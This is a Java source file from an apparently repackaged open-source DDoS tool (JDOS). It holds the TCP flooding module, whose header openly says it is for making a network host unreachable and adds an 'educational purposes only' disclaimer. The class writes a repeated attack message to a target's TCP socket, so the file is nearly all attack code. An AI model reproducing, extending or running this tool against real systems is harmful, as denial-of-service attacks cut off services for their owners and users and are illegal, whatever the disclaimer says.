/*
 * This program was written by Tobias Schmidradler (schmidi000)
 * and published under the MIT License.
 * 
 * What kind of program is this?
 * This is a program for performing a Distributed Denial of Serivce (DDOS).
 * With a DDOS you could make a host in the network unreachable.
 *
 * 
 * All rights are reserved.
 * 
 * NOTE: 
 * ------------------------------------------------------------------------------------------
 * This program is only for educational purposes!
 * You use this on your own risk. 
 * Distributed Denial of Service attacks are illegal, you could go to jail for this.
 * ------------------------------------------------------------------------------------------
 * 
 * I am liable for nothing!
 *
 * Link: https://github.com/schmidi000/JDOS
 * E-Mail: tobias.schmidradler@gmail.com
 * Website: www.straim.com
 * Copyright (c) 2015
 */
package gq.glowman554.modules.impl.ddos.protocols.implementations;

import gq.glowman554.modules.impl.ddos.DDOSPattern;
import gq.glowman554.modules.impl.ddos.protocols.interfaces.TCP;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;

/**
 * DDOS implementation for the TCP protocol.
 * 
 * @author Tobias Schmidradler
 * 
 * Last changed: 13.05.2015
 */
public class TCPDDos extends TCP {
    
    /**
     * Constructor.
     * Create a TCP DDOS with a specified DDOS Pattern.
     * @param ddosPattern 
     */
    public TCPDDos(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }
    
    @Override
    public void writeLineToSocket(String message) {
        try(BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(getSocket().getOutputStream()))) {
            bw.write(getDdosPattern().getMessage());
            bw.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
